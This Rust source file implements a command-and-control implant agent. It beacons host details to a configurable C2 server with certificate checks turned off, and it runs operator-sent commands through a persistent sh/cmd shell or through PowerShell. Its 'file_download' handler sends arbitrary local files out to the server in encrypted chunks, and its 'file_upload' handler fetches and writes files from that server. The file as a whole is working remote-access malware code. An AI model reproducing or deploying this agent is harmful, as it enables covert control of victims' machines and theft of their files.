use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use uuid::Uuid;
use std::fs;
use std::time::Duration;
use tokio::time::sleep;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use std::sync::Arc;
use tokio::sync::Mutex;
use std::process::Stdio;
use sysinfo::System;

mod system_info;
mod auth;
mod crypto;
mod config;
mod file_transfer;

const DEFAULT_BEACON_INTERVAL_SECS: u64 = 30;
const MIN_BEACON_INTERVAL_SECS: u64 = 5;
const MAX_BEACON_INTERVAL_SECS: u64 = 3600;
const SHELL_SENTINEL: &str = "__C2_BEACON_DONE_7f3a9b2c__";
const CMD_TIMEOUT_SECS: u64 = 30;

#[derive(Serialize)]
struct BeaconPayload {
    id: String,
    status: String,
    bootstrap: bool,
    hostname: String,
    os: String,
    cpu_usage: f64,
    memory_usage: f64,
    disk_usage: f64,
}

#[derive(Serialize)]
struct EncryptedEnvelope {
    payload: String,
}

#[derive(Deserialize)]
struct EncryptedResponse {
    payload: String,
}

#[derive(Deserialize)]
struct BeaconResponse {
    success: bool,
    timestamp: String,
    commands: Vec<PendingCommand>,
    sleep_interval_secs: u64,
    session_key: Option<String>,
}

#[derive(Deserialize, Clone)]
struct PendingCommand {
    id: String,
    command_type: String,
    payload: String,
}

#[derive(Deserialize)]
struct FileDownloadPayload {
    transfer_id: String,
    file_path: String,
}

#[derive(Deserialize)]
struct FileUploadPayload {
    transfer_id: String,
    dest_path: String,
    chunks_total: usize,
    checksum: String,
}

struct PersistentShell {
    stdin: tokio::process::ChildStdin,
    stdout: BufReader<tokio::process::ChildStdout>,
    child: tokio::process::Child,
}

impl PersistentShell {
    async fn new() -> Option<Self> {
        let mut child = if cfg!(target_os = "windows") {
            tokio::process::Command::new("cmd")
                .arg("/K")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::null())
                .kill_on_drop(true)
                .spawn()
                .ok()?
        } else {
            tokio::process::Command::new("sh")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::null())
                .kill_on_drop(true)
                .spawn()
                .ok()?
        };

        let mut stdin = child.stdin.take()?;
        let stdout = child.stdout.take()?;
        let mut reader = BufReader::new(stdout);

        let init = if cfg!(target_os = "windows") {
            format!("echo {}\r\n", SHELL_SENTINEL)
        } else {
            format!("echo {}\n", SHELL_SENTINEL)
        };

        stdin.write_all(init.as_bytes()).await.ok()?;
        stdin.flush().await.ok()?;

        let mut line = String::new();
        loop {
            line.clear();
            match tokio::time::timeout(Duration::from_secs(5), reader.read_line(&mut line)).await {
                Ok(Ok(0)) => return None,
                Ok(Ok(_)) => {
                    if line.trim_end_matches(|c| c == '\n' || c == '\r') == SHELL_SENTINEL {
                        break;
                    }
                }
                _ => return None,
            }
        }

        Some(PersistentShell { stdin, stdout: reader, child })
    }
}

fn apply_sleep_interval(current: u64, requested: u64) -> u64 {
    if requested >= MIN_BEACON_INTERVAL_SECS && requested <= MAX_BEACON_INTERVAL_SECS {
        if requested != current {
            println!("Beacon interval updated to {} seconds", requested);
        }
        requested
    } else {
        eprintln!(
            "Server sent invalid interval {}s; keeping {}s (valid range: {}-{}s)",
            requested, current, MIN_BEACON_INTERVAL_SECS, MAX_BEACON_INTERVAL_SECS
        );
        current
    }
}

fn default_beacon_interval() -> u64 {
    std::env::var("C2_BEACON_INTERVAL")
        .ok()
        .and_then(|v| v.parse().ok())
        .filter(|&v| v >= MIN_BEACON_INTERVAL_SECS && v <= MAX_BEACON_INTERVAL_SECS)
        .or_else(|| {
            let embedded = config::embedded_beacon_interval();
            if embedded >= MIN_BEACON_INTERVAL_SECS && embedded <= MAX_BEACON_INTERVAL_SECS {
                Some(embedded)
            } else {
                None
            }
        })
        .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS)
}

#[tokio::main]
async fn main() {
    let agent_id = get_or_create_agent_id();
    let hostname = system_info::get_hostname();
    let os = system_info::get_os_name();

    let server_url = std::env::var("C2_SERVER_URL")
        .unwrap_or_else(|_| config::embedded_server_url().to_string());

    let auth_token = auth::compute_agent_token(&agent_id);
    let psk = auth::get_psk();
    let psk_key = crypto::derive_key_from_psk(&psk);

    let mut session_key: Option<[u8; 32]> = None;
    let mut sleep_interval_secs = default_beacon_interval();

    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()
        .expect("Failed to create HTTPS client");

    let mut sys = System::new_all();
    let shell: Arc<Mutex<Option<PersistentShell>>> = Arc::new(Mutex::new(None));

    loop {
        let bootstrap = session_key.is_none();
        let metrics = system_info::get_system_metrics(&mut sys);

        let payload = BeaconPayload {
            id: agent_id.clone(),
            status: "alive".to_string(),
            bootstrap,
            hostname: hostname.clone(),
            os: os.clone(),
            cpu_usage: metrics.cpu_usage,
            memory_usage: metrics.memory_usage,
            disk_usage: metrics.disk_usage,
        };

        let encrypt_key = session_key.as_ref().unwrap_or(&psk_key);
        let payload_bytes = match serde_json::to_vec(&payload) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("Serialize error: {}", e);
                sleep(Duration::from_secs(sleep_interval_secs)).await;
                continue;
            }
        };

        let encrypted = match crypto::encrypt(&payload_bytes, encrypt_key) {
            Ok(e) => e,
            Err(e) => {
                eprintln!("Encrypt error: {}", e);
                sleep(Duration::from_secs(sleep_interval_secs)).await;
                continue;
            }
        };

        let beacon_url = format!("{}/api/beacon", server_url.trim_end_matches('/'));
        let mut force_rebootstrap = false;

        match client
            .post(&beacon_url)
            .header("Authorization", format!("Bearer {}", auth_token))
            .header("X-Agent-Id", &agent_id)
            .json(&EncryptedEnvelope { payload: encrypted })
            .send()
            .await
        {
            Ok(response) => {
                if response.status().is_success() {
                    let decrypt_key = session_key.as_ref().unwrap_or(&psk_key);
                    match response.json::<EncryptedResponse>().await {
                        Ok(envelope) => match crypto::decrypt(&envelope.payload, decrypt_key) {
                            Ok(plaintext) => {
                                match serde_json::from_slice::<BeaconResponse>(&plaintext) {
                                    Ok(beacon_resp) => {
                                        if beacon_resp.success {
                                            sleep_interval_secs = apply_sleep_interval(
                                                sleep_interval_secs,
                                                beacon_resp.sleep_interval_secs,
                                            );
                                            if let Some(key_hex) = beacon_resp.session_key {
                                                match crypto::key_from_hex(&key_hex) {
                                                    Ok(key) => session_key = Some(key),
                                                    Err(e) => {
                                                        eprintln!("Invalid session key: {}", e);
                                                        force_rebootstrap = true;
                                                    }
                                                }
                                            }
                                            for cmd in beacon_resp.commands {
                                                execute_command(
                                                    &client,
                                                    &server_url,
                                                    &agent_id,
                                                    &auth_token,
                                                    session_key.as_ref(),
                                                    cmd,
                                                    Arc::clone(&shell),
                                                )
                                                .await;
                                            }
                                        }
                                    }
                                    Err(e) => eprintln!("Parse beacon response error: {}", e),
                                }
                            }
                            Err(e) => {
                                eprintln!("Decrypt error: {}", e);
                                if !bootstrap {
                                    force_rebootstrap = true;
                                }
                            }
                        },
                        Err(e) => eprintln!("Read response error: {}", e),
                    }
                } else if response.status() == reqwest::StatusCode::UNAUTHORIZED {
                    force_rebootstrap = true;
                } else {
                    eprintln!("Beacon rejected: HTTP {}", response.status());
                }
            }
            Err(e) => eprintln!("Beacon failed: {}", e),
        }

        if force_rebootstrap {
            session_key = None;
        }

        sleep(Duration::from_secs(sleep_interval_secs)).await;
    }
}

async fn run_shell_command(shell: &mut PersistentShell, command: &str) -> String {
    let wrapped = if cfg!(target_os = "windows") {
        format!("{} 2>&1\r\necho {}\r\n", command, SHELL_SENTINEL)
    } else {
        format!("{{ {}; }} 2>&1\necho {}\n", command, SHELL_SENTINEL)
    };

    if shell.stdin.write_all(wrapped.as_bytes()).await.is_err() {
        return String::from("__SHELL_WRITE_FAILED__");
    }
    if shell.stdin.flush().await.is_err() {
        return String::from("__SHELL_WRITE_FAILED__");
    }

    let mut output = String::new();
    let mut line = String::new();

    loop {
        line.clear();
        match tokio::time::timeout(
            Duration::from_secs(CMD_TIMEOUT_SECS),
            shell.stdout.read_line(&mut line),
        )
        .await
        {
            Ok(Ok(0)) => break,
            Ok(Ok(_)) => {
                let trimmed = line.trim_end_matches(|c| c == '\n' || c == '\r');
                if trimmed == SHELL_SENTINEL {
                    break;
                }
                output.push_str(trimmed);
                output.push('\n');
            }
            Ok(Err(e)) => {
                output.push_str(&format!("\nRead error: {}", e));
                break;
            }
            Err(_) => {
                output.push_str("\nCommand timed out (30s). Shell process is still alive.");
                break;
            }
        }
    }

    if output.ends_with('\n') {
        output.pop();
    }
    output
}

async fn execute_shell_persistent(
    shell_guard: &Arc<Mutex<Option<PersistentShell>>>,
    command: &str,
) -> String {
    let mut guard = shell_guard.lock().await;

    if guard.is_none() {
        *guard = PersistentShell::new().await;
    }

    let needs_respawn = if let Some(ref mut sh) = *guard {
        let result = run_shell_command(sh, command).await;
        if result == "__SHELL_WRITE_FAILED__" {
            true
        } else {
            return result;
        }
    } else {
        return String::from("Failed to spawn shell process");
    };

    if needs_respawn {
        *guard = PersistentShell::new().await;
        if let Some(ref mut sh) = *guard {
            let result = run_shell_command(sh, command).await;
            if result == "__SHELL_WRITE_FAILED__" {
                return String::from("Shell failed to respawn");
            }
            return result;
        }
        return String::from("Failed to respawn shell process");
    }

    String::from("Unexpected shell state")
}

async fn execute_command(
    client: &Client,
    server_url: &str,
    agent_id: &str,
    auth_token: &str,
    session_key: Option<&[u8; 32]>,
    cmd: PendingCommand,
    shell: Arc<Mutex<Option<PersistentShell>>>,
) {
    let output = match cmd.command_type.as_str() {
        "shell" | "bash" | "cmd" => execute_shell_persistent(&shell, &cmd.payload).await,
        "powershell" => execute_powershell(&cmd.payload).await,
        "session_kill" => {
            let mut guard = shell.lock().await;
            if let Some(mut sh) = guard.take() {
                let _ = sh.child.kill().await;
            }
            String::from("Session terminated. Persistent shell killed. Working directory resets on next command.")
        }
        "sleep" => {
            if let Ok(secs) = cmd.payload.trim().parse::<u64>() {
                sleep(Duration::from_secs(secs)).await;
                format!("Slept for {} seconds", secs)
            } else {
                String::from("Invalid sleep payload — expected integer seconds")
            }
        }
        "file_download" => {
            handle_file_download(client, server_url, agent_id, auth_token, session_key, &cmd).await
        }
        "file_upload" => {
            handle_file_upload(client, server_url, agent_id, auth_token, session_key, &cmd).await
        }
        _ => format!("Unknown command type: {}", cmd.command_type),
    };

    let psk_key = crypto::derive_key_from_psk(&auth::get_psk());
    let encrypt_key = session_key.unwrap_or(&psk_key);

    let result_payload = json!({
        "agent_id": agent_id,
        "command_id": cmd.id,
        "output": output,
        "status": "completed"
    });

    let payload_bytes = match serde_json::to_vec(&result_payload) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("Serialize result error: {}", e);
            return;
        }
    };

    let encrypted = match crypto::encrypt(&payload_bytes, encrypt_key) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("Encrypt result error: {}", e);
            return;
        }
    };

    let result_url = format!("{}/api/result", server_url.trim_end_matches('/'));
    match client
        .post(&result_url)
        .header("Authorization", format!("Bearer {}", auth_token))
        .header("X-Agent-Id", agent_id)
        .json(&EncryptedEnvelope { payload: encrypted })
        .send()
        .await
    {
        Ok(resp) => {
            if !resp.status().is_success() {
                eprintln!("Send result HTTP {}", resp.status());
            }
        }
        Err(e) => eprintln!("Send result error: {}", e),
    }
}

async fn execute_powershell(command: &str) -> String {
    match tokio::process::Command::new("powershell")
        .args(["-Command", command])
        .output()
        .await
    {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("STDOUT:\n{}\n\nSTDERR:\n{}", stdout, stderr)
        }
        Err(e) => format!("Failed to execute PowerShell: {}", e),
    }
}

async fn handle_file_download(
    client: &Client,
    server_url: &str,
    agent_id: &str,
    auth_token: &str,
    session_key: Option<&[u8; 32]>,
    cmd: &PendingCommand,
) -> String {
    let params: FileDownloadPayload = match serde_json::from_str(&cmd.payload) {
        Ok(p) => p,
        Err(e) => return format!("Invalid file_download payload: {}", e),
    };

    let chunks = match file_transfer::read_file_chunks(&params.file_path) {
        Ok(c) => c,
        Err(e) => return format!("Failed to read file: {}", e),
    };

    let psk_key = crypto::derive_key_from_psk(&auth::get_psk());
    let encrypt_key = session_key.unwrap_or(&psk_key);

    for chunk in &chunks {
        let body = json!({
            "transfer_id": params.transfer_id,
            "agent_id": agent_id,
            "chunk_index": chunk.chunk_index,
            "chunks_total": chunks.len(),
            "data_b64": chunk.data_b64,
            "checksum": chunk.checksum,
        });

        let payload_bytes = match serde_json::to_vec(&body) {
            Ok(b) => b,
            Err(e) => return format!("Serialize chunk failed: {}", e),
        };
        let encrypted = match crypto::encrypt(&payload_bytes, encrypt_key) {
            Ok(e) => e,
            Err(e) => return format!("Encrypt chunk failed: {}", e),
        };

        let url = format!("{}/api/files/chunk", server_url.trim_end_matches('/'));
        match client
            .post(&url)
            .header("Authorization", format!("Bearer {}", auth_token))
            .header("X-Agent-Id", agent_id)
            .json(&EncryptedEnvelope { payload: encrypted })
            .send()
            .await
        {
            Ok(resp) if resp.status().is_success() => {}
            Ok(resp) => return format!("Chunk upload failed: HTTP {}", resp.status()),
            Err(e) => return format!("Chunk upload error: {}", e),
        }
    }

    format!(
        "Uploaded {} chunks for transfer {} from {}",
        chunks.len(),
        params.transfer_id,
        params.file_path
    )
}

async fn handle_file_upload(
    client: &Client,
    server_url: &str,
    agent_id: &str,
    auth_token: &str,
    session_key: Option<&[u8; 32]>,
    cmd: &PendingCommand,
) -> String {
    let params: FileUploadPayload = match serde_json::from_str(&cmd.payload) {
        Ok(p) => p,
        Err(e) => return format!("Invalid file_upload payload: {}", e),
    };

    let psk_key = crypto::derive_key_from_psk(&auth::get_psk());
    let encrypt_key = session_key.unwrap_or(&psk_key);

    for index in 0..params.chunks_total {
        let url = format!(
            "{}/api/files/{}/chunks/{}",
            server_url.trim_end_matches('/'),
            params.transfer_id,
            index
        );

        let resp = match client
            .get(&url)
            .header("Authorization", format!("Bearer {}", auth_token))
            .header("X-Agent-Id", agent_id)
            .send()
            .await
        {
            Ok(r) => r,
            Err(e) => return format!("Failed to fetch chunk {}: {}", index, e),
        };

        if !resp.status().is_success() {
            return format!("Chunk {} fetch failed: HTTP {}", index, resp.status());
        }

        let envelope: EncryptedResponse = match resp.json().await {
            Ok(e) => e,
            Err(e) => return format!("Invalid chunk response: {}", e),
        };

        let plaintext = match crypto::decrypt(&envelope.payload, encrypt_key) {
            Ok(p) => p,
            Err(e) => return format!("Decrypt chunk failed: {}", e),
        };

        #[derive(Deserialize)]
        struct ChunkData {
            data_b64: String,
            checksum: String,
        }

        let chunk: ChunkData = match serde_json::from_slice(&plaintext) {
            Ok(c) => c,
            Err(e) => return format!("Parse chunk failed: {}", e),
        };

        if let Err(e) =
            file_transfer::write_file_chunk(&params.dest_path, index, &chunk.data_b64, &chunk.checksum)
        {
            return format!("Write chunk {} failed: {}", index, e);
        }
    }

    match file_transfer::verify_file_checksum(&params.dest_path, &params.checksum) {
        Ok(true) => format!(
            "File saved to {} ({} chunks verified)",
            params.dest_path, params.chunks_total
        ),
        Ok(false) => format!("File assembled but checksum mismatch at {}", params.dest_path),
        Err(e) => format!("Checksum verification error: {}", e),
    }
}

fn get_or_create_agent_id() -> String {
    let id_file = "agent_id.txt";
    if let Ok(id) = fs::read_to_string(id_file) {
        let trimmed = id.trim();
        if !trimmed.is_empty() {
            return trimmed.to_string();
        }
    }
    let new_id = Uuid::new_v4().to_string();
    let _ = fs::write(id_file, &new_id);
    new_id
}
